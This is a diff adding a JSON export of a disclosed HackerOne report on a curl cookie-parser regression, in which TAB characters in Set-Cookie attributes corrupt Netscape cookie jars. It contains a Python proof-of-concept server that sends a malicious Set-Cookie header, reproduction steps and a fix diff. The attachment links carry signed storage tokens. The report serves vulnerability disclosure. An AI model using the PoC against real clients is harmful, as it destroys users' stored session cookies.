@@ -1,0 +1,166 @@
+{
+  "id": 3641893,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjQxODkz",
+  "url": "https://hackerone.com/reports/3641893",
+  "title": "Cookie attribute TAB injection regression in Set-Cookie parsing",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "low",
+  "readable_substate": "Informative",
+  "created_at": "2026-04-01T08:24:43.172Z",
+  "submitted_at": "2026-04-01T08:24:43.980Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "calaba_zas",
+    "url": "/calaba_zas",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-35252"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-04-03T14:54:03.679Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-04-01T09:19:17.184Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Overview\n\n| | |\n|---|---|\n| **Component** | `lib/cookie.c` — `parse_cookie_header()` |\n| **Type** | Security regression (incomplete input validation) |\n| **CWE** | CWE-20 Improper Input Validation |\n| **Severity** | LOW (CVSS 3.1 estimated ~3.7, comparable to CVE-2022-35252) |\n| **Affected** | curl 8.18.0 through current HEAD |\n| **Not affected** | curl 8.17.0 and earlier |\n| **Regression of** | `bfe9b59be4` (2022-10-05) reported by Trail of Bits |\n| **Introduced by** | `a78a07d3a9` (2025-12-07) \"cookie: cleanups and improvements\" |\n\n---\n\n## Description\n\nThe cookie parser in `parse_cookie_header()` iterates over all semicolon-separated name=value pairs in a Set-Cookie header. A TAB validation check that originally applied to **every** pair (including cookie attributes such as `path=` and `domain=`) was moved inside the first-pair conditional block during a refactoring commit. As a result, only the cookie name and value are validated for TAB characters; attribute values are no longer checked.\n\nBecause the Netscape cookie file format uses TAB (0x09) as its field delimiter, a TAB character embedded in an attribute value corrupts the cookie jar when written to disk. When the jar is subsequently read back, `parse_netscape()` counts more fields than the expected seven and silently discards the entry, causing permanent loss of the affected cookie.\n\n---\n\n## Root Cause\n\n### Original fix (2022-10-05)\n\nCommit `bfe9b59be473c9cc96313dc618595d33d946761a`, reported by Trail of Bits, placed the TAB check immediately after the attribute value was parsed — before the code determines whether the current pair is the cookie name/value or a subsequent attribute:\n\n```c\n// Applies to ALL pairs: name/value, path=, domain=, etc.\nvlen = strcspn(ptr, \";\\r\\n\");\nvaluep = ptr;\n...\n/* Reject cookies with a TAB inside the value */\nif(memchr(valuep, '\\t', vlen)) {\n  infof(data, \"cookie contains TAB, dropping\");\n  return CERR_TAB;\n}\n...\nif(!co->name) {\n  /* first pair handling */\n```\n\n### Regression (2025-12-07)\n\nCommit `a78a07d3a9dc808a51f464d0dd297939e544e2a4` (\"cookie: cleanups and improvements\") restructured the parser. The commit message states:\n\n> *\"Validation checks (length, TAB, prefixes) moved into the first name/value pair block for better code organization\"*\n\nAfter this change the TAB check only executes inside `if(!curlx_strlen(&cookie[COOKIE_NAME]))`, which is the first-pair block:\n\n```c\nif(!curlx_str_single(&ptr, '=')) {\n  sep = TRUE;\n  if(!curlx_str_cspn(&ptr, &val, \";\\r\\n\"))\n    curlx_str_trimblanks(&val);\n  // TAB check REMOVED from here\n}\n\nif(!curlx_strlen(&cookie[COOKIE_NAME])) {\n  // TAB check MOVED here — only runs for the cookie name/value\n  ...\n  if(curlx_strlen(&val) &&\n     memchr(curlx_str(&val), '\\t', curlx_strlen(&val))) {\n    infof(data, \"cookie contains TAB, dropping\");\n    return CURLE_OK;\n  }\n  ...\n  cookie[COOKIE_NAME] = name;\n  cookie[COOKIE_VALUE] = val;\n}\nelse if(curlx_str_casecompare(&name, \"path\")) {\n  cookie[COOKIE_PATH] = val;   // TAB in val reaches co->path\n}\n```\n\nThe attribute value parser at line 462 uses `\";\\r\\n\"` as delimiters — TAB is not a delimiter for attribute values. A TAB in `path=/app\\x09...` passes through into `cookie[COOKIE_PATH]`, then into `co->path` via `sanitize_cookie_path()` (which does not filter TABs), and finally into the Netscape cookie file via `get_netscape_format()` (which uses `\\t` as the field separator).\n\n---\n\n## Proof of Concept\n\n### Requirements\n\n- curl 8.18.0 or later (source build)\n- Python 3\n\n### Server (`poc.py`)\n\n```python\nimport socket\n\n# Initialize the server socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\nsock.bind(('127.0.0.1', 8009))\nsock.listen(1)\n\nprint(\"[*] Listening on 127.0.0.1:8009\")\n\nwhile True:\n    conn, _ = sock.accept()\n    req = conn.recv(4096).decode('utf-8', errors='replace')\n    \n    # Path to set the cookie\n    if '/set' in req:\n        print(\"[+] Sending malicious Set-Cookie with real TAB byte\")\n        # Build the response in BYTES to ensure the TAB (\\x09) is literal\n        r =  b\"HTTP/1.1 200 OK\\r\\n\"\n        r += b\"Content-Length: 2\\r\\n\"\n        # We add 'expires' to force curl to write it into the jar.txt file\n        r += b\"Set-Cookie: session=abc123; expires=Fri, 01 Jan 2027 00:00:00 GMT; path=/app\"\n        r += b\"\\x09injected\" # The injected raw TAB byte\n        r += b\"\\r\\n\\r\\nOK\"\n        conn.sendall(r)\n        \n    # Path to check if the cookie is sent back\n    elif '/check' in req:\n        if 'Cookie:' in req:\n            print(\"[+] COOKIE RECEIVED\")\n            body = \"Cookie received\"\n        else:\n            print(\"[!] NO COOKIE - Corruption confirmed\")\n            body = \"No cookie received - LOST\"\n        \n        resp = f\"HTTP/1.1 200 OK\\r\\nContent-Length: {len(body)}\\r\\n\\r\\n{body}\".encode()\n        conn.sendall(resp)\n    \n    conn.close()\n```\n{F5650793}\n\n### Reproduction\n\n```\nTerminal 1:\n$ python3 poc.py\n\nTerminal 2:\n$ git checkout curl-8_18_0\n{F5650803}\n\n$ cmake -B build && cmake --build build -j$(nproc)\n$ rm -f /tmp/jar.txt ( if you already have one )\n$ ./build/src/curl -v -c /tmp/jar.txt http://127.0.0.1:8009/set\n\n{F5650812}\n\n$ cat /tmp/jar.txt\n\n{F5650815}\n\n$ ./build/src/curl -b /tmp/jar.txt http://127.0.0.1:8009/check\n```\n{F5650818}\n\n### Expected output\n\n**Step 1** — curl accepts the cookie (TAB in path is not rejected):\n\n```\nAdded cookie session=\"abc123\" for domain 127.0.0.1,\npath /app  injected, expire 0\n```\n\n**Step 2** — cookie jar is corrupted (8 fields instead of 7):\n\n```\n127.0.0.1\tFALSE\t/app\tinjected\tFALSE\t0\tsession\tabc123\n```\n\n**Step 3** — re-read fails, cookie is lost:\n\n```\nNo cookie - LOST\n```\n\n### Control test (curl 8.17.0 — not vulnerable)\n\n```\n$ git checkout curl-8_17_0\n$ cmake -B build && cmake --build build -j$(nproc)\n$ ./build/src/curl -v -c /tmp/jar.txt http://127.0.0.1:8009/set\n* cookie contains TAB, dropping  <-- correctly rejected\n```\n\n### Verified on\n\n```\ncurl 8.18.0-DEV (Linux) libcurl/8.18.0-DEV OpenSSL/3.0.13\non Kali Linux — VULNERABLE\n\ncurl 8.17.0-DEV (Linux) libcurl/8.17.0-DEV OpenSSL/3.0.13\non Kali Linux — NOT VULNERABLE\n\ncurl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.13\nUbuntu 24.04 system curl — NOT VULNERABLE\n```\n\n---\n\n## Impact\n\n- **Cookie jar file corruption.** A malicious HTTP server can send a Set-Cookie header with a TAB in the path attribute. The resulting cookie jar entry violates the Netscape format specification.\n\n- **Persistent cookie loss.** When the corrupted jar is read back (via `curl -b`, `CURLOPT_COOKIEFILE`, or any libcurl application that persists cookies), the entry is silently discarded because the field count does not equal seven. The cookie is permanently lost without any error or warning to the user.\n\n- **Selective denial of service.** An attacker can target specific cookies for destruction by responding with a same-name cookie that includes a TAB-injected path attribute. The legitimate cookie is overwritten in memory, then corrupted on disk, and finally lost on re-read.\n\n- **Not possible:** Cross-domain cookie injection. The `parse_netscape()` field-count check (`fields != 7`) prevents the corrupted entry from being loaded with shifted fields, so an attacker cannot redirect a cookie to a different domain through this bug.\n\n---\n\n## Suggested Fix\n\nMove the TAB check back to its original position, outside the first-pair block, so it runs for every name=value pair including attributes:\n\n```diff\n--- a/lib/cookie.c\n+++ b/lib/cookie.c\n@@ -459,8 +459,15 @@\n     if(!curlx_str_single(&ptr, '=')) {\n       sep = TRUE;\n-      if(!curlx_str_cspn(&ptr, &val, \";\\r\\n\"))\n+      if(!curlx_str_cspn(&ptr, &val, \";\\r\\n\")) {\n         curlx_str_trimblanks(&val);\n+\n+        /* Reject cookies with a TAB in any value (name, path, domain).\n+           TABs corrupt the Netscape cookie jar format. */\n+        if(curlx_strlen(&val) &&\n+           memchr(curlx_str(&val), '\\t', curlx_strlen(&val))) {\n+          infof(data, \"cookie contains TAB, dropping\");\n+          return CURLE_OK;\n+        }\n+      }\n     }\n\n     if(!curlx_strlen(&cookie[COOKIE_NAME])) {\n-      ...\n-      /* Reject cookies with a TAB inside the value */\n-      if(curlx_strlen(&val) &&\n-         memchr(curlx_str(&val), '\\t', curlx_strlen(&val))) {\n-        infof(data, \"cookie contains TAB, dropping\");\n-        return CURLE_OK;\n-      }\n```\n\n---\n\n## Timeline\n\n| Date | Event |\n|------|-------|\n| 2022-10-05 | Original TAB fix committed (`bfe9b59be4`, Trail of Bits) |\n| 2025-12-07 | Regression introduced (`a78a07d3a9`, refactoring) |\n| 2026-01-22 | curl 8.18.0 released (first vulnerable release) |\n\n## References\n\n- Original fix: [`bfe9b59be4`](https://github.com/curl/curl/commit/bfe9b59be473c9cc96313dc618595d33d946761a)\n- Trail of Bits report: https://curl.se/mail/lib-2022-10/0032.html\n- Issue: https://github.com/curl/curl/issues/9659\n- Regression commit: [`a78a07d3a9`](https://github.com/curl/curl/commit/a78a07d3a9dc808a51f464d0dd297939e544e2a4)\n- Comparable CVE: [CVE-2022-35252](https://curl.se/docs/CVE-2022-35252.html) (CVSS 3.7)\n\n## Impact\n\n## Summary:\nA malicious HTTP server can inject a TAB character (`0x09`) into the `path` attribute of a `Set-Cookie` response header. Because curl 8.18.0+ no longer validates TAB characters in cookie attribute values (regression of fix `bfe9b59be4`), the TAB is accepted and stored in memory.\n\nWhen the cookie jar is written to disk in Netscape format, the embedded TAB acts as a field separator, corrupting the line structure (producing 8+ fields instead of the expected 7). On subsequent re-read of the cookie jar, `parse_netscape()` rejects the malformed entry, causing silent and permanent loss of the affected cookie.\n\nAn attacker can exploit this to:\n\n1. **Destroy specific cookies** by responding with a same-name cookie containing a TAB-injected path, overwriting the legitimate cookie in memory and corrupting it on disk.\n2. **Disrupt session persistence** in any application that uses cookie jar files (`curl -c/-b`, `CURLOPT_COOKIEJAR`/`CURLOPT_COOKIEFILE`), causing authentication tokens or session cookies to silently disappear between curl invocations.\n3. **Corrupt the cookie jar file on disk**, violating the Netscape format specification. Other tools that consume the same cookie jar file may also be affected by the malformed entries.\n\nThe attack requires no user interaction beyond the victim making an HTTP request to the attacker-controlled server while using a persistent cookie jar.\n\n> **Note:** Cross-domain cookie injection is not possible through this bug — the field-count validation in `parse_netscape()` prevents corrupted entries from being loaded with shifted field values.",
+  "weakness": {
+    "id": 107,
+    "name": "Improper Input Validation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5650793,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mfentufjg2jjcxqwtovm2imctrbh?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTMNSWY4M%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T162222Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDoUZKgr7jjd8LkZ%2FRr%2Bon56gmbmfISXIgCwNUMnweINAIhALvx5xl6Rdwh4nnZfXIbHrCXAy%2F7tfJwtRIlofsXmENZKrIFCD8QAxoMMDEzNjE5Mjc0ODQ5IgxLIlovrTaOfkq2MScqjwWIuT3T4TFYuU%2FKGAq0Vsc8%2FiUecAgZUZLv7ZWO2w0%2BLjZXiIPDVXcNTA8oWoeCKfr%2B%2FYWopKzIgcJadreG07kgLgx4S4UcREh0z8lkomiap9hU3DU4Ceckmz8KRjsxbNyndEHwl3YmgoUd%2BZF9jDBLop0M6O6AOZrjK1DhUMZFtYHHs0uQaknaTYvYnFGrkTBmc7VLd1SlYR1s7SRJMxlqNnlRltsUo1GiDhno9FC5jO7eUMbYICSx6BL2%2BQhRFv9SiMaIuw966fLSuaYDpEF1Dvuw5z39pnqEAZ5yg%2FJhD8nihxy0NvJcUENbokbhJlcxpFoO%2BHPvnsD68WwHqf87dkNtco42SUG0mWYz586SsaDBvYpsj7iVyhiZBMu2WnUZs%2F6oNqvO2SDf6EvYJPDqxM5xm8BAw7ZmR8w6A54P%2Fkfnjw0aHLqEb2QYfXsEbMqLXpi9vSnUD%2BmoF375Oqi9Jngqv%2BpX732WkvhHtqtgWAka8QB2hPD7YJdeSIENN3XA2ROeuZdby2tkztUnGqv%2BY%2FmUqvg5jojrDaHxIyQiIak%2Bn3PcxoWZjXPdlnG7IkayuucXpp9SzU2DUT0n2ntz%2FlPCxrxrlGSsw4jjxNh7YIRj8VEIVMdIxiqoCTO7%2BTKB5KTMZDi5WVqPzV%2Fm3EBOcyNRSFHF8sKSv4DuC5%2FgOkGS1MGBhk7IktcQujpWW3GqH5L7lXiqhNb4d3c0tQKZ2JY2uhqvSOIiNVIAr3mLTEdoxrqJSs2qVJNqSCgd39zfPAQEp3EbxEp%2F52qP8X%2FhiS0TWlm%2BW0rrbKhgOaz2%2BEz%2Fa%2FBPbsvv1quklvi1jP7b7nK6v4sb3gr%2F%2Bb8t2wIphustkHwgVgk4ZsuudpdlMNr3188GOrABPdgib1UAX7il7WvJ7oB0HDaH%2BPgMEDuF%2BiAJznp9O7RltJJJrjUmS2HMBkbHd8Zrt%2BCKC6rcw7XIaslKWZbb4npVP1cFbT6FbSINlTmuOI2y7XC69xMxGTm1zHc9bsI7BwQTvzP%2BtfiGMgeQMzO3hyoZ0NRqMwLoDGFmaUNq9foAkK9SA5x3u3pwAklbjWHB%2FRorx50eY%2FvBhSJ12OZHR2wu4R9mY%2Br3BsiNO6AGgRw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b6150e1cd556b61754406ce8043897c6d7236d570c61ea816a95a0020d78ff27",
+      "file_size": 210998,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5650803,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yxp7mlmot753jgyg2070riovwgr6?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTMNSWY4M%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T162222Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDoUZKgr7jjd8LkZ%2FRr%2Bon56gmbmfISXIgCwNUMnweINAIhALvx5xl6Rdwh4nnZfXIbHrCXAy%2F7tfJwtRIlofsXmENZKrIFCD8QAxoMMDEzNjE5Mjc0ODQ5IgxLIlovrTaOfkq2MScqjwWIuT3T4TFYuU%2FKGAq0Vsc8%2FiUecAgZUZLv7ZWO2w0%2BLjZXiIPDVXcNTA8oWoeCKfr%2B%2FYWopKzIgcJadreG07kgLgx4S4UcREh0z8lkomiap9hU3DU4Ceckmz8KRjsxbNyndEHwl3YmgoUd%2BZF9jDBLop0M6O6AOZrjK1DhUMZFtYHHs0uQaknaTYvYnFGrkTBmc7VLd1SlYR1s7SRJMxlqNnlRltsUo1GiDhno9FC5jO7eUMbYICSx6BL2%2BQhRFv9SiMaIuw966fLSuaYDpEF1Dvuw5z39pnqEAZ5yg%2FJhD8nihxy0NvJcUENbokbhJlcxpFoO%2BHPvnsD68WwHqf87dkNtco42SUG0mWYz586SsaDBvYpsj7iVyhiZBMu2WnUZs%2F6oNqvO2SDf6EvYJPDqxM5xm8BAw7ZmR8w6A54P%2Fkfnjw0aHLqEb2QYfXsEbMqLXpi9vSnUD%2BmoF375Oqi9Jngqv%2BpX732WkvhHtqtgWAka8QB2hPD7YJdeSIENN3XA2ROeuZdby2tkztUnGqv%2BY%2FmUqvg5jojrDaHxIyQiIak%2Bn3PcxoWZjXPdlnG7IkayuucXpp9SzU2DUT0n2ntz%2FlPCxrxrlGSsw4jjxNh7YIRj8VEIVMdIxiqoCTO7%2BTKB5KTMZDi5WVqPzV%2Fm3EBOcyNRSFHF8sKSv4DuC5%2FgOkGS1MGBhk7IktcQujpWW3GqH5L7lXiqhNb4d3c0tQKZ2JY2uhqvSOIiNVIAr3mLTEdoxrqJSs2qVJNqSCgd39zfPAQEp3EbxEp%2F52qP8X%2FhiS0TWlm%2BW0rrbKhgOaz2%2BEz%2Fa%2FBPbsvv1quklvi1jP7b7nK6v4sb3gr%2F%2Bb8t2wIphustkHwgVgk4ZsuudpdlMNr3188GOrABPdgib1UAX7il7WvJ7oB0HDaH%2BPgMEDuF%2BiAJznp9O7RltJJJrjUmS2HMBkbHd8Zrt%2BCKC6rcw7XIaslKWZbb4npVP1cFbT6FbSINlTmuOI2y7XC69xMxGTm1zHc9bsI7BwQTvzP%2BtfiGMgeQMzO3hyoZ0NRqMwLoDGFmaUNq9foAkK9SA5x3u3pwAklbjWHB%2FRorx50eY%2FvBhSJ12OZHR2wu4R9mY%2Br3BsiNO6AGgRw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=42a786cb8cc0df5e289aff9b50f76066c5c8117525ddda06610b91f7b3284636",
+      "file_size": 15835,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5650812,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dlrgbywnz20eitdeamdjk4j5rt1v?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTMNSWY4M%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T162222Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDoUZKgr7jjd8LkZ%2FRr%2Bon56gmbmfISXIgCwNUMnweINAIhALvx5xl6Rdwh4nnZfXIbHrCXAy%2F7tfJwtRIlofsXmENZKrIFCD8QAxoMMDEzNjE5Mjc0ODQ5IgxLIlovrTaOfkq2MScqjwWIuT3T4TFYuU%2FKGAq0Vsc8%2FiUecAgZUZLv7ZWO2w0%2BLjZXiIPDVXcNTA8oWoeCKfr%2B%2FYWopKzIgcJadreG07kgLgx4S4UcREh0z8lkomiap9hU3DU4Ceckmz8KRjsxbNyndEHwl3YmgoUd%2BZF9jDBLop0M6O6AOZrjK1DhUMZFtYHHs0uQaknaTYvYnFGrkTBmc7VLd1SlYR1s7SRJMxlqNnlRltsUo1GiDhno9FC5jO7eUMbYICSx6BL2%2BQhRFv9SiMaIuw966fLSuaYDpEF1Dvuw5z39pnqEAZ5yg%2FJhD8nihxy0NvJcUENbokbhJlcxpFoO%2BHPvnsD68WwHqf87dkNtco42SUG0mWYz586SsaDBvYpsj7iVyhiZBMu2WnUZs%2F6oNqvO2SDf6EvYJPDqxM5xm8BAw7ZmR8w6A54P%2Fkfnjw0aHLqEb2QYfXsEbMqLXpi9vSnUD%2BmoF375Oqi9Jngqv%2BpX732WkvhHtqtgWAka8QB2hPD7YJdeSIENN3XA2ROeuZdby2tkztUnGqv%2BY%2FmUqvg5jojrDaHxIyQiIak%2Bn3PcxoWZjXPdlnG7IkayuucXpp9SzU2DUT0n2ntz%2FlPCxrxrlGSsw4jjxNh7YIRj8VEIVMdIxiqoCTO7%2BTKB5KTMZDi5WVqPzV%2Fm3EBOcyNRSFHF8sKSv4DuC5%2FgOkGS1MGBhk7IktcQujpWW3GqH5L7lXiqhNb4d3c0tQKZ2JY2uhqvSOIiNVIAr3mLTEdoxrqJSs2qVJNqSCgd39zfPAQEp3EbxEp%2F52qP8X%2FhiS0TWlm%2BW0rrbKhgOaz2%2BEz%2Fa%2FBPbsvv1quklvi1jP7b7nK6v4sb3gr%2F%2Bb8t2wIphustkHwgVgk4ZsuudpdlMNr3188GOrABPdgib1UAX7il7WvJ7oB0HDaH%2BPgMEDuF%2BiAJznp9O7RltJJJrjUmS2HMBkbHd8Zrt%2BCKC6rcw7XIaslKWZbb4npVP1cFbT6FbSINlTmuOI2y7XC69xMxGTm1zHc9bsI7BwQTvzP%2BtfiGMgeQMzO3hyoZ0NRqMwLoDGFmaUNq9foAkK9SA5x3u3pwAklbjWHB%2FRorx50eY%2FvBhSJ12OZHR2wu4R9mY%2Br3BsiNO6AGgRw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=25323cd31b75059d1ee039b9ae56d4576262a5302751097fabcbf79524322590",
+      "file_size": 239319,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5650815,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/n2atwkgrvui71blt63m8ky9vn6t3?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTMNSWY4M%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T162222Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDoUZKgr7jjd8LkZ%2FRr%2Bon56gmbmfISXIgCwNUMnweINAIhALvx5xl6Rdwh4nnZfXIbHrCXAy%2F7tfJwtRIlofsXmENZKrIFCD8QAxoMMDEzNjE5Mjc0ODQ5IgxLIlovrTaOfkq2MScqjwWIuT3T4TFYuU%2FKGAq0Vsc8%2FiUecAgZUZLv7ZWO2w0%2BLjZXiIPDVXcNTA8oWoeCKfr%2B%2FYWopKzIgcJadreG07kgLgx4S4UcREh0z8lkomiap9hU3DU4Ceckmz8KRjsxbNyndEHwl3YmgoUd%2BZF9jDBLop0M6O6AOZrjK1DhUMZFtYHHs0uQaknaTYvYnFGrkTBmc7VLd1SlYR1s7SRJMxlqNnlRltsUo1GiDhno9FC5jO7eUMbYICSx6BL2%2BQhRFv9SiMaIuw966fLSuaYDpEF1Dvuw5z39pnqEAZ5yg%2FJhD8nihxy0NvJcUENbokbhJlcxpFoO%2BHPvnsD68WwHqf87dkNtco42SUG0mWYz586SsaDBvYpsj7iVyhiZBMu2WnUZs%2F6oNqvO2SDf6EvYJPDqxM5xm8BAw7ZmR8w6A54P%2Fkfnjw0aHLqEb2QYfXsEbMqLXpi9vSnUD%2BmoF375Oqi9Jngqv%2BpX732WkvhHtqtgWAka8QB2hPD7YJdeSIENN3XA2ROeuZdby2tkztUnGqv%2BY%2FmUqvg5jojrDaHxIyQiIak%2Bn3PcxoWZjXPdlnG7IkayuucXpp9SzU2DUT0n2ntz%2FlPCxrxrlGSsw4jjxNh7YIRj8VEIVMdIxiqoCTO7%2BTKB5KTMZDi5WVqPzV%2Fm3EBOcyNRSFHF8sKSv4DuC5%2FgOkGS1MGBhk7IktcQujpWW3GqH5L7lXiqhNb4d3c0tQKZ2JY2uhqvSOIiNVIAr3mLTEdoxrqJSs2qVJNqSCgd39zfPAQEp3EbxEp%2F52qP8X%2FhiS0TWlm%2BW0rrbKhgOaz2%2BEz%2Fa%2FBPbsvv1quklvi1jP7b7nK6v4sb3gr%2F%2Bb8t2wIphustkHwgVgk4ZsuudpdlMNr3188GOrABPdgib1UAX7il7WvJ7oB0HDaH%2BPgMEDuF%2BiAJznp9O7RltJJJrjUmS2HMBkbHd8Zrt%2BCKC6rcw7XIaslKWZbb4npVP1cFbT6FbSINlTmuOI2y7XC69xMxGTm1zHc9bsI7BwQTvzP%2BtfiGMgeQMzO3hyoZ0NRqMwLoDGFmaUNq9foAkK9SA5x3u3pwAklbjWHB%2FRorx50eY%2FvBhSJ12OZHR2wu4R9mY%2Br3BsiNO6AGgRw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=05a43a7cdcc67a519d34182b800c066eacb307ef478eea7a402c86f06ec136bc",
+      "file_size": 62697,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5650818,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ixcki7vf4zyi29ricelw4vv0j86t?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTMNSWY4M%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T162222Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDoUZKgr7jjd8LkZ%2FRr%2Bon56gmbmfISXIgCwNUMnweINAIhALvx5xl6Rdwh4nnZfXIbHrCXAy%2F7tfJwtRIlofsXmENZKrIFCD8QAxoMMDEzNjE5Mjc0ODQ5IgxLIlovrTaOfkq2MScqjwWIuT3T4TFYuU%2FKGAq0Vsc8%2FiUecAgZUZLv7ZWO2w0%2BLjZXiIPDVXcNTA8oWoeCKfr%2B%2FYWopKzIgcJadreG07kgLgx4S4UcREh0z8lkomiap9hU3DU4Ceckmz8KRjsxbNyndEHwl3YmgoUd%2BZF9jDBLop0M6O6AOZrjK1DhUMZFtYHHs0uQaknaTYvYnFGrkTBmc7VLd1SlYR1s7SRJMxlqNnlRltsUo1GiDhno9FC5jO7eUMbYICSx6BL2%2BQhRFv9SiMaIuw966fLSuaYDpEF1Dvuw5z39pnqEAZ5yg%2FJhD8nihxy0NvJcUENbokbhJlcxpFoO%2BHPvnsD68WwHqf87dkNtco42SUG0mWYz586SsaDBvYpsj7iVyhiZBMu2WnUZs%2F6oNqvO2SDf6EvYJPDqxM5xm8BAw7ZmR8w6A54P%2Fkfnjw0aHLqEb2QYfXsEbMqLXpi9vSnUD%2BmoF375Oqi9Jngqv%2BpX732WkvhHtqtgWAka8QB2hPD7YJdeSIENN3XA2ROeuZdby2tkztUnGqv%2BY%2FmUqvg5jojrDaHxIyQiIak%2Bn3PcxoWZjXPdlnG7IkayuucXpp9SzU2DUT0n2ntz%2FlPCxrxrlGSsw4jjxNh7YIRj8VEIVMdIxiqoCTO7%2BTKB5KTMZDi5WVqPzV%2Fm3EBOcyNRSFHF8sKSv4DuC5%2FgOkGS1MGBhk7IktcQujpWW3GqH5L7lXiqhNb4d3c0tQKZ2JY2uhqvSOIiNVIAr3mLTEdoxrqJSs2qVJNqSCgd39zfPAQEp3EbxEp%2F52qP8X%2FhiS0TWlm%2BW0rrbKhgOaz2%2BEz%2Fa%2FBPbsvv1quklvi1jP7b7nK6v4sb3gr%2F%2Bb8t2wIphustkHwgVgk4ZsuudpdlMNr3188GOrABPdgib1UAX7il7WvJ7oB0HDaH%2BPgMEDuF%2BiAJznp9O7RltJJJrjUmS2HMBkbHd8Zrt%2BCKC6rcw7XIaslKWZbb4npVP1cFbT6FbSINlTmuOI2y7XC69xMxGTm1zHc9bsI7BwQTvzP%2BtfiGMgeQMzO3hyoZ0NRqMwLoDGFmaUNq9foAkK9SA5x3